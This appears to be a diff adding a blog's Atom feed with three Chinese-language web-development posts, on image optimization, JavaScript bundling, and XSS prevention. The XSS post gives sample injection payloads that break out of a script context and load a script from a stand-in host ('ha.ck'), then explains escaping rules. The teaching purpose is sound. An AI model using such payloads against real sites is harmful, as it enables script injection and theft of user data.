@@ -1,0 +1,240 @@
+<?xml version="1.0" encoding="utf-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom">
+
+  <title><![CDATA[Category: web | Hank Lin]]></title>
+  <link href="http://hanklin.com/blog/categories/web/atom.xml" rel="self"/>
+  <link href="http://hanklin.com/"/>
+  <updated>2013-03-22T10:47:20+08:00</updated>
+  <id>http://hanklin.com/</id>
+  <author>
+    <name><![CDATA[Hank Lin]]></name>
+    
+  </author>
+  <generator uri="http://octopress.org/">Octopress</generator>
+
+  
+  <entry>
+    <title type="html"><![CDATA[網站小圖檔的規範(1)]]></title>
+    <link href="http://hanklin.com/blog/2012/03/15/image-optimize-1"/>
+    <updated>2012-03-15T10:13:43+08:00</updated>
+    <id>http://hanklin.com/blog/2012/03/15/image-optimize-1</id>
+    <content type="html"><![CDATA[<h2>令人又愛又恨的小圖檔</h2>
+
+
+<p>小圖檔在網站上，扮演一個很重要的角色。即使是像我這個懶得放圖的blog，還是得有favicon小圖示，按鈕、上一頁/下一頁的小圖示等。一般的商業網站更是需要大量的圖。這些圖的請求量通常很驚人，所以怎麼優化就變得很重要了。
+根據Yahoo!的研究(http://www.yuiblog.com/blog/2008/10/29/imageopt-1/)，圖的請求量(總bytes數)，平均約佔總傳輸量的46.6%。當然每個網站都不相同，但是這個平均數也太驚人了。如果可以減少圖的負擔，網頁可以讀取得更快，伺服器也可以服務更多的使用者，頻寬費也可以降低。所以要做一個高品質的網站，圖的規範最好從一開始就建立好。</p>
+
+<h2>縮小圖檔的大小</h2>
+
+
+<p>優化圖檔有許多作法，其中一個最簡單的作法就是：縮小圖檔的大小(bytes數)。
+一般設計師輸出的圖，常常存了許多不必要的資訊(metadata)，在網站顯示這些圖檔是完全不需要這些資訊的，把它們去除通常可以減少檔案大小。唯一要注意的就是有版權的圖是不能這樣作的，除非你有這張圖的版權。另外可以做的就是優化壓縮的效率，而不至於損失圖像的資訊(lossless)。可以縮小圖檔大小的工具有很多，我們可以只看一些免費的工具。</p>
+
+<ul>
+  <li><a href="http://www.imagemagick.org/">imagemagick</a>: 萬用的圖像工具</li>
+  <li><a href="http://optipng.sourceforge.net/">OptiPNG</a>: 專門處理png的工具</li>
+  <li><a href="http://pmt.sourceforge.net/pngcrush/">PNGCrush</a>: 專門處理png的工具</li>
+  <li><a href="http://psydk.org/PngOptimizer.php">PngOptimizer</a>: 專門處理png的工具</li>
+  <li><a href="http://advsys.net/ken/utils.htm">PngOut</a>: 專門處理png的工具</li>
+  <li><a href="http://advancemame.sourceforge.net/comp-readme.html">AdvanceCOMP</a>: 專門處理png的工具</li>
+  <li><a href="http://www.walbeehm.com/download/">DeflOpt</a>: 專門處理png的工具</li>
+  <li><a href="http://pngquant.org/">PngQuant</a>: 把png24轉成png8的工具</li>
+  <li><a href="http://pngnq.sourceforge.net/">Pngnq</a>:  把png24轉成png8的工具</li>
+  <li><a href="http://pornel.net/pngnq">Improved Pngnq</a>:  把png24轉成png8的工具</li>
+  <li><a href="http://entropymine.com/imageworsener/">ImageWorsener</a>:  把png24轉成png8的工具</li>
+  <li><a href="http://jpegclub.org/">JPEGTran</a>: 專門處理jpeg的工具</li>
+  <li><a href="http://www.lcdf.org/gifsicle/">Gifsicle</a>: 專門處理動畫gif的工具 </li>
+</ul>
+
+
+<p>可以用的工具不少，每一種工具對不同的圖，處理完的大小還可能有不小的差異。但是要對每個圖試用每一個工具，拿最小的來使用，會太花時間。所以只要選一個自己覺得好用的來用就可以了。
+據我的經驗，jpeg最多可以減少20%的大小，png則可以減少10%的大小。</p>
+
+<h2>處理圖檔的原則</h2>
+
+
+<ul>
+  <li>圖的尺寸較小、但要有清析的邊緣，例如小圖示，使用png。缺點是使用png8時，顏色受到限制，用png24在大圖的檔案大小又會太大。</li>
+  <li>圖的尺寸較大、顏色要鮮明，例如照片，使用jpeg。缺點是高對比的邊緣和大色塊會模糊</li>
+  <li>可以的話，把所有gif轉成png8(除了動畫gif)，或是一開始就規定不要使用gif。</li>
+  <li>動畫gif的數目也要儘量減少，有的話，使用工具去縮小</li>
+  <li>用工具對所有png圖檔執行縮小的步驟</li>
+  <li>用工具對所有jpeg圖檔執行縮小的步驟</li>
+</ul>
+
+
+
+
+<h2>壓縮</h2>
+
+
+<p>許多網站伺服器，如Apache, 或是應用程式框架，都有動態壓縮輸出內容的功能，可以很簡單的設定那些輸出是要壓縮的。由於常用的圖檔格式: jpeg、png、gif都是已經壓縮過的，再經過壓縮程序常常多花時間、花記憶體、花CPU，但常常壓出來的東西反而還更大，所以這些圖都記得絕不要設定壓縮。</p>
+
+<h2>favicon</h2>
+
+
+<p>一定要記得在你的網站放favicon，而且favicon最好不要太大，最好小於1KB。有的favicon檔案包含了各種大小的圖檔，所以就會太大。可以的話，使用16色palette png就好了。動畫gif的favicon是完全不必要的，要避免(但是動態更換favicon倒是在一些場合很有用)。</p>
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[JavaScript的處理方式]]></title>
+    <link href="http://hanklin.com/blog/2011/11/03/javascript-1"/>
+    <updated>2011-11-03T21:04:36+08:00</updated>
+    <id>http://hanklin.com/blog/2011/11/03/javascript-1</id>
+    <content type="html"><![CDATA[<p>每個原始檔要先最小化，然後依照引用的順序合併。檔名可以在佈署時動態產生，常用的選擇有亂數、佈署版本的號碼或名稱、最後修改的檔案時間戳記、或可閱讀的曰期時間字串。</p>
+
+<p>每個頁面所引用的JavaScript檔，組合會有很多種。所以對整個網站考量時，就有幾種合併的作法，以下是比較常用的。</p>
+
+<ul>
+  <li><h4>整個網站用到的所有JavaScript，都合併成一個檔案</h4>
+    適合所有頁面引用的JavaScript，組合並不多時。並且引用的順序都一樣，也就是順序不影響的時候。這種作法當然網站速度最快，但是常常每個頁面引用的JavaScript，都有不同。而且有些JavaScript檔案，只在一、二個網頁被引用到，這個比例高的話，就變成每一頁都還要引用原本只需要在那一個網頁要讀取的JavaScript。有一些這類的JavaScript函式庫還滿大的，例如所見即所得編輯器(WYSIWYG)，所以實務上不見得是最適合的作法。
+  </li>
+  <li><h4>將所有頁面，或是超過一半的頁面，都有引用到的JavaScript，合併成一個檔案</h4>
+    這個JavaScript會被全部的網頁所引用，然後每個網頁再各自去合併自已的專屬JavaScript檔案。也就是變成一個是整個網站都用到的合併檔，另一個是這個網頁用到的合併檔。這樣的作法，會減少單一頁面的傳輸量，不至於包含了過多沒有用到的JavaScript檔案，但是至少會有兩次的JavaScript請求。適合每個網頁所引用的JavaScript很分歧，而且檔案又不算小的時候。這也是一般常見的情況。
+  </li>
+  <li><h4>每一個網頁各自合併自己引用的檔案</h4>
+    這樣每個網頁只會有一個JavaScript請求，而且不會有多餘的內容，也容許相同組合的JavaScript以不同順序引用。缺點就是你可能需要把JavaScript合併成多種組合，最多到和網頁數一樣多。如果在各網頁間，引用相同的JavaScrip檔案數量很少時，就適合用這個作法。其實這個作法不用管理"共同的"及"各別的"JavaScript檔案，是我比較喜歡的作法。
+  </li>
+</ul>
+
+
+<p>合併完成後，再來就是要最小化（minify）。JavaScript很適合最小化，可以用語法解析器（parser）檢查，並把不需要的空白去掉。例如使用rhino、jslint。</p>
+
+<p>在合併完後，尤其是最小化之後，JavaScript原始檔會變得完全不能由人去編輯，所以合併及最小化的工作必須在佈署時期，由工具幫我們作。最好是命令列的工具，可以整合進專案的自動管理流程。
+如果原本的一個JavaScript檔案，被合併到多個合併後的檔案。那麼，即使你只改了原始檔的一個字，所有合併後的檔案，都要重新產生，使用者也應該重新下載。 這裡可能有二個問題：</p>
+
+<ul>
+  <li>我們有設定快取標頭，如何通知使用者(瀏覽器)下載新的合併檔？
+  </li>
+  <li>只改一個檔案的一個字，就要使用者重新下載合併的檔案，會不會影響速度？
+  </li>
+</ul>
+
+
+<p>第一個問題，只要改變下載合併檔的URL，下次使用者到這個網頁，就會重新下載這個合併檔。麻煩的地方在於，我們要把所有修改過的合併檔，傳到伺服器上。也就是說，一定要再走一次佈署流程，把所有合併檔都產生好，再佈署上去，即使有工具幫我們作，負擔也是不小，過程也很多地方可能會出錯。所以使用「lazy initialization」，在伺服器端作「合併」、「最小化」的工作，也是一個不錯的方法。
+第二個問題，我認為影響不大。因為我們的目標是，即使客戶端完全沒有快取，也要能很快的顯示網頁。以每一個網頁只使用一到兩個<code><script></code>元素來看，負擔很小。這也可以說是，因為我們把請求數目大量的減少，所以不用太擔心快取的問題。</p>
+
+<p>進行好合併、最小化之後，其它的工作就比較簡單了。也就是在網站伺服器上，對JavaScript檔案進行壓縮及設定快取標頭，把JavaScript的下載最佳化。</p>
+
+<p>JavaScript檔案和區塊，都應該放在HTML文件的最後面。例如我的習慣，是像這樣子：</p>
+
+<pre><code>
+<html>
+  <head></head>
+  <body>
+ 
+    ......
+  
+    <script src="combined.js"></script>
+    <script>
+      $(function() {
+        init(); 
+      });
+    </script>
+  </body>
+</html>
+</code></pre>
+
+
+<p>我們常常需要在我們的網站上，引用第三方的JavaScript函式庫，如社羣網站API、測量工具、或廣告商等。以前通常會對放置JavaScript的區塊作限制，甚至要求要用document.write()的語法，對我們網站的效能造成嚴重的限制。我真的不希望使用者看我的網頁，要先等廣告render好，才出現真正的內容。尤其是JavaScript的請求會擋住(block)網頁的render，如果第三方的網站回應較慢，還會連累我們的網站，讓使用者等半天，只看到白畫面。
+還好，現在比較大的第三方JavaScript函式庫，都支援了非同步的JavaScript使用法。所以我們也要把這些JavaScript，在HTML文件和資源都準備好(onload)之後，再去呼叫初始化。初始化的步驟通常是用JavaScript插入一段引用第三方JavaScript函式庫的<script>元素，然後傳入必要的參數。</p>
+
+<p>現在非同步的JavaScript函式庫的支援很常見，所以一定要用這個方法去引用。如果你要用的函式庫，沒有支援非同步的使用法，那我建議考慮別家，有支援非同步的函式庫。</p>
+
+<p>另外應該避免的作法，就是使用「inline」的JavaScript，或是說<script>區塊。所謂的「inline」，就是直接寫在HTML裡的<script>元素，例如：</p>
+
+<pre><code>
+<div>
+  <script>
+    alert("!"); 
+  </script>
+  <img src="what.png" />
+</div>
+</code></pre>
+
+
+<p>inline又分成兩種，一種是寫在靜態HTML裡，如果量不多倒是還好。另一種是隨著伺服器端腳本（server side script）或範本（template）工具動態產生的HTML寫出去的。</p>
+
+<p>這兩種作法都會造成許多管理、開發、和優化的麻煩，所以要從一開始就要儘量避免。</p>
+
+<p>如果要最小化這些源始碼，必須先把inline的一段段<script>的內容拿出來，進行最小化處理之後，再塞回原本的地方。這個過程很囉嗦，也很容易出錯。</p>
+
+<p>然而，還有一種寫法比inline更糟，那就是用伺服器端腳本或範本工具，動態產生JavaScript區塊，例如：</p>
+
+<pre><code>
+<script>
+  alert("Hello, <%=userName%>"); 
+</script>
+</code></pre>
+
+
+<p>這種程式碼是很難進行自動化優化的，而且維護成本非常高，無論如何你都應該避免這種寫法。</p>
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[Preventing XSS (I)]]></title>
+    <link href="http://hanklin.com/blog/2011/06/01/preventing-xss-i"/>
+    <updated>2011-06-01T10:18:41+08:00</updated>
+    <id>http://hanklin.com/blog/2011/06/01/preventing-xss-i</id>
+    <content type="html"><![CDATA[<p>作網站要很注意XSS, 和SQL Injection, 可以說是基本中的基本. 這一篇文章是我對如何防止XSS(Cross-Site Scripting)的看法, 但是絕不能認為注意到我提到的地方就可以完全防止了. 攻擊的方法不斷地更新, 網站開發者也要隨時提高警覺, 注意新消息才能避免自己的網站成為下一個受害者.</p>
+
+<h2>基本原理</h2>
+
+
+<p>以現今的網站來說, 幾乎已經沒有完全靜態的網站. 只要有顯示動態資料, 尤其是使用者產生的資料, 就有被XSS的可能. XSS的型態有非常多種, 但主要都是為了要插入一段攻擊者寫的JavaScript, 一但攻擊者能這麼作, 你的網站就能被他利用, 可以作非常多事, 像是偷取網站和其它使用者的資料, 或是讓使用者去安裝殭屍程式. 可以加個<code><iframe></code>, 可以加個<code><script></code>, 基本上就是控制了你的網頁.</p>
+
+<p>看一下例子: 例如在<code><script></code>block裡輸出動態資料:
+<code></p>
+
+<script>
+  var comment = "<?php echo $comment;?>";
+</script>
+
+
+<p></code>
+那攻擊者可以把comment寫成:
+<code>
+";</script><script src="http://ha.ck/"/><script>//
+</code>
+就可以執行任意的JavaScript, 如果是認真的攻擊者, 通常會有3步以上的代理, 利用複雜步驟隱藏真正的意圖, 可能是偷取使用者資訊, 或是安裝trojan horse. 不是在<code><script></code>block裡就沒問題嗎? 唉, 更簡單:
+<code></p>
+
+<p>
+  <?php echo $comment;?>
+</p>
+</code>
+聰明的你, 馬上就知道, 直接不客氣的把comment寫成:
+<code>
+<script src="http://ha.ck/"/>
+</code>
+嘩! hacker練功的好機會!
+
+<h2>心態與作法</h2>
+基本原則就是:
+<p style="font-size:1.4em">絕對不要相信資料來源是無惡意的, 尤其是使用者輸入(或產生)的資料</p>
+所以任何輸出動態html都要作html escaping. 最基本的5大元素: <code>&amp; < > " &#39;</code> 要escape成<code>&amp;amp; &amp;lt; &amp;gt; &amp;quot; &amp;#39;</code>
+如果是寫動態javascript的字串, 還要注意javascript的escaping, 和html是完全不同的, 要注意的是: <code> / " &#39;</code> 要escape成<code>\ / " &#39;</code>
+
+不過事情總是沒有那麼簡單, 例如: 有時候希望讓使用者打一些有html格式的東西, 如<img>. 就不能單純的一口氣全escape了. 也不能使用regex來拔掉可疑的東西, 因為這不但容易錯, 把正常的markup砍掉, 漏洞又很大, 可以輕易找到避開regex規則的寫法. 有一些作法是在client端先用prototype, jquery等js libraries先處理, 是一個不錯的作法. 另外就是, escape要固定在一個地方, 最好是在顯示之前, 然後其它地方就不要escape了. escape的規則和流程也要固定. 否則就會看到使用者打一個&amp;, 讀寫個幾次就會變成千千萬萬個&amp;&amp;&amp;...
+
+有一個很常見的情況:
+<code>
+<a onclick=&#39;doSomethingWith("<?php echo $myData?>")&#39;>
+</code>
+
+同時包含了html和javascript, 所以要先escape javascript, 再escape html. 如果反過來的話, single quote和double quote就會少escape一次, (因為變成&amp;開頭了) 就會造成漏洞.
+
+<h2>Reference</h2>
+這篇我整理了好久, 還是寫不完. 不能拖太久, 所以先把完成的貼出來. 也許整個主題寫好之後再來整理比較好. 有興趣的可以先參考以下的連結:
+<ul>
+<li><a href="https://www.owasp.org/index.php/XSS_(Cross_Site_Scripting)_Prevention_Cheat_Sheet">https://www.owasp.org/index.php/XSS_(Cross_Site_Scripting)_Prevention_Cheat_Sheet</a></li>
+<li><a href="http://www.squarefree.com/securitytips/web-developers.html">http://www.squarefree.com/securitytips/web-developers.html</a></li>
+<li><a href="http://wonko.com/post/html-escaping">http://wonko.com/post/html-escaping</a></li>
+</ul>
+
+]]></content>
+  </entry>
+  
+</feed>
